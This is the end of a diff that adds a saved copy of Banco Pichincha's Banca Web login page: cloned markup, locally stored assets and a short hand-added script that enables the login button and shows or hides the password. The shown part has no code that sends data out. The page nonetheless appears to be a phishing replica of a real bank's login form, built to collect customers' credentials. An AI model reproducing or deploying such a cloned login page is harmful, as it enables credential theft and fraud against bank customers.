+                                                                                                                    tu
+                                                                                                                    contraseña?
+                                                                                                                </button>
+                                                                                                            </div>
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                                        class="row">
+                                                                                                        <div _ngcontent-tiy-c185=""
+                                                                                                            class="col-12">
+                                                                                                            <bb-load-button-ui
+                                                                                                                _ngcontent-tiy-c185=""
+                                                                                                                id="btn-ingresar-login"
+                                                                                                                color="primary"
+                                                                                                                tabindex="4"
+                                                                                                                buttonsize="md"
+                                                                                                                type="submit"
+                                                                                                                class="btn-semibold btn-block">
+                                                                                                                <button
+                                                                                                                    bbbutton=""
+                                                                                                                    class="bb-load-button btn-primary btn-md btn btn-block"
+                                                                                                                    disabled=""
+                                                                                                                    type="submit"
+                                                                                                                    aria-label="Login"
+                                                                                                                    id="btnSubmit">
+                                                                                                                    <span
+                                                                                                                        class="bb-load-button__content">
+                                                                                                                        Ingresar
+                                                                                                                    </span>
+                                                                                                                </button>
+                                                                                                            </bb-load-button-ui>
+                                                                                                        </div>
+                                                                                                    </div>
+
+                                                                                                    <script>
+                                                                                                        const btnPass = document.getElementById("btnPass");
+                                                                                                        const bb_input_0 = document.getElementById("bb_input_0");
+                                                                                                        const bb_input_1 = document.getElementById("bb_input_1");
+                                                                                                        const btnSubmit = document.getElementById("btnSubmit");
+
+                                                                                                        bb_input_0.addEventListener("input", e => {
+                                                                                                            if (e.target.value.length > 0 && bb_input_1.value.length > 0) {
+                                                                                                                btnSubmit.removeAttribute("disabled");
+                                                                                                            } else {
+                                                                                                                btnSubmit.setAttribute("disabled", "");
+                                                                                                            }
+                                                                                                        });
+
+                                                                                                        bb_input_1.addEventListener("input", e => {
+                                                                                                            if (e.target.value.length > 0) {
+                                                                                                                btnPass.style = "display: block";
+                                                                                                                btnPass.innerHTML = "<span>MOSTRAR</span>";
+                                                                                                            }
+
+                                                                                                            if (e.target.value.length > 0 && bb_input_0.value.length > 0) {
+                                                                                                                btnSubmit.removeAttribute("disabled");
+                                                                                                            } else {
+                                                                                                                btnSubmit.setAttribute("disabled", "");
+                                                                                                            }
+                                                                                                        });
+
+                                                                                                        btnPass.addEventListener("click", () => {
+                                                                                                            btnShow = !btnShow;
+                                                                                                            if (!btnShow) {
+                                                                                                                btnPass.innerHTML = "<span>MOSTRAR</span>";
+
+                                                                                                                bb_input_1.classList.remove("font-prelo");
+                                                                                                                bb_input_1.classList.add("font-dot");
+                                                                                                            } else {
+                                                                                                                btnPass.innerHTML = "<span>OCULTAR</span>";
+                                                                                                                bb_input_1.classList.remove("font-dot");
+                                                                                                                bb_input_1.classList.add("font-prelo");
+                                                                                                            }
+                                                                                                        });
+
+
+                                                                                                    </script>
+
+                                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                                        class="d-flex w-100 space-btn-box">
+                                                                                                    </div>
+                                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                                        class="radio-toolbar">
+                                                                                                        <input
+                                                                                                            _ngcontent-tiy-c185=""
+                                                                                                            type="radio"
+                                                                                                            id="unlockAccount"
+                                                                                                            name="flowHelp"
+                                                                                                            data-ng-model="flowHelp"
+                                                                                                            value="unlockAccount"><label
+                                                                                                            _ngcontent-tiy-c185=""
+                                                                                                            id="lb-desbloquear-banca-login"
+                                                                                                            for="unlockAccount"
+                                                                                                            style="margin-right: 8px;">
+                                                                                                            <div _ngcontent-tiy-c185=""
+                                                                                                                class="pwb-icon"
+                                                                                                                style="padding-bottom: 2px;">
+                                                                                                                <em _ngcontent-tiy-c185=""
+                                                                                                                    class="pwb-icon-unlock box-login-icon-size"></em>
+                                                                                                            </div>
+                                                                                                            Desbloquea
+                                                                                                            tu <p
+                                                                                                                _ngcontent-tiy-c185=""
+                                                                                                                style="margin-bottom: 0;">
+                                                                                                                Banca
+                                                                                                                Web </p>
+                                                                                                        </label><input
+                                                                                                            _ngcontent-tiy-c185=""
+                                                                                                            type="radio"
+                                                                                                            id="membership"
+                                                                                                            name="flowHelp"
+                                                                                                            data-ng-model="flowHelp"
+                                                                                                            value="recoverPassword"
+                                                                                                            tabindex="7"><label
+                                                                                                            _ngcontent-tiy-c185=""
+                                                                                                            id="lb-recuperar-contrasena-login"
+                                                                                                            for="membership"
+                                                                                                            style="margin-left: 8px;">
+                                                                                                            <div _ngcontent-tiy-c185=""
+                                                                                                                class="pwb-icon"
+                                                                                                                style="padding-bottom: 2px;">
+                                                                                                                <em _ngcontent-tiy-c185=""
+                                                                                                                    class="pwb-icon-person-login box-login-icon-size"></em>
+                                                                                                            </div>
+                                                                                                            Regístrate a
+                                                                                                            <p _ngcontent-tiy-c185=""
+                                                                                                                style="margin-bottom: 0;">
+                                                                                                                Banca
+                                                                                                                Web </p>
+                                                                                                        </label></div>
+                                                                                                </form>
+                                                                                            </div>
+                                                                                            <div _ngcontent-tiy-c185=""
+                                                                                                class="footer-terms footer marginTop24 marginBottom24 d-lg-none">
+                                                                                                <label
+                                                                                                    _ngcontent-tiy-c185=""
+                                                                                                    class="terms"><a
+                                                                                                        _ngcontent-tiy-c185=""
+                                                                                                        class="btn-link-pichincha">Términos
+                                                                                                        de
+                                                                                                        uso</a> © 2022
+                                                                                                    Banco Pichincha.
+                                                                                                    Todos los derechos
+                                                                                                    reservados</label>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div><!----><!----><!---->
+                                                                            </pbw-login-container><!----><!----><!----><!----><!----></pbw-login-widget>
+                                                                        <!----></bb-chrome><!----><!----><!----><!----><!----></bb-area>
+                                                            </bb-panel-container><!----></bb-chrome><!----><!----><!----><!----></bb-route><!----></bb-deck-container><!---->
+                                            </bb-chrome><!----><!----><!----><!----><!----></bb-area>
+                                        <template></template>
+                                        <template></template><!----><!----></bb-root>
+                                    <template></template>
+                                    <pbw-otp-modal-component _nghost-tiy-c163="">
+                                        <bb-modal-ui _ngcontent-tiy-c163=""><!----></bb-modal-ui>
+                                        <pbw-cd-lanzamiento-modal-widget _ngcontent-tiy-c163="">
+                                            <bb-modal-ui><!----></bb-modal-ui>
+                                        </pbw-cd-lanzamiento-modal-widget>
+                                        <pbw-clave-digital-educacion-widget _ngcontent-tiy-c163="" _nghost-tiy-c160="">
+                                            <bb-modal-ui _ngcontent-tiy-c160=""><!----></bb-modal-ui>
+                                        </pbw-clave-digital-educacion-widget>
+                                    </pbw-otp-modal-component><!----></pbw-pichincha-banca-web-public>
+                                <div class="main-error-window" id="main-error-window">
+                                    <div class="header">
+                                        <img src="assets/logo_pichincha(1).svg" alt="Logo Pichincha">
+                                    </div>
+                                    <div class="body">
+                                        <div class="box">
+                                            <div class="icon-container">
+                                                <em class="icon-warn-browser"></em>
+                                            </div>
+                                            <h1>¡Te recomendamos <br> utilizar otro navegador!</h1>
+                                            <p>Para mejorar tu experiencia en Banca Web <br> debes usar o descargar
+                                                estos navegadores:</p>
+                                            <div class="browsers-icons mt-5">
+                                                <div class="wrapper-icons-browser">
+                                                    <span class="icon-container">
+                                                        <em class="icon-chrome center-item"></em>
+                                                    </span>
+                                                    <label class="text-center name-browser">
+                                                        <a href="https://www.google.com/intl/es/chrome/?brand=CHBD&amp;brand=UUXU&amp;gclid=CjwKCAjwhaaKBhBcEiwA8acsHC0EkqP4mj5lSwRat2GZrp1mk6OTzc2Nbh-OUElmP7YUNFpFyDmquxoCa8MQAvD_BwE&amp;gclsrc=aw.ds"
+                                                            target="_blank" rel="noopener">
+                                                            Google Chrome
+                                                        </a>
+                                                    </label>
+                                                </div>
+                                                <div class="wrapper-icons-browser">
+                                                    <span class="icon-container">
+                                                        <em class="icon-firefox center-item"></em>
+                                                    </span>
+                                                    <label class="text-center name-browser">
+                                                        <a href="https://www.mozilla.org/en-US/firefox/new/"
+                                                            target="_blank" rel="noopener">
+                                                            Firefox Mozilla
+                                                        </a>
+                                                    </label>
+                                                </div>
+                                            </div>
+                                            <button class="entendido">Entendido</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="mini-popup-resolution"></div>
+
+    <iframe id="_hjSafeContext_78671567" title="_hjSafeContext" tabindex="-1" aria-hidden="true"
+        src="assets/saved_resource(1).html"
+        style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
+    <div>
+        <div class="grecaptcha-badge" data-style="bottomright"
+            style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+            <div class="grecaptcha-logo">
+                <iframe title="reCAPTCHA" src="assets/anchor.html" width="256" height="60" role="presentation"
+                    name="a-hmw32x4h47u5" frameborder="0" scrolling="no"
+                    sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe>
+            </div>
+            <div class="grecaptcha-error"></div>
+            <textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response"
+                style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+        </div>
+        <iframe style="display: none;" src="assets/saved_resource(2).html"></iframe>
+    </div>
+</body>
+
+</html>
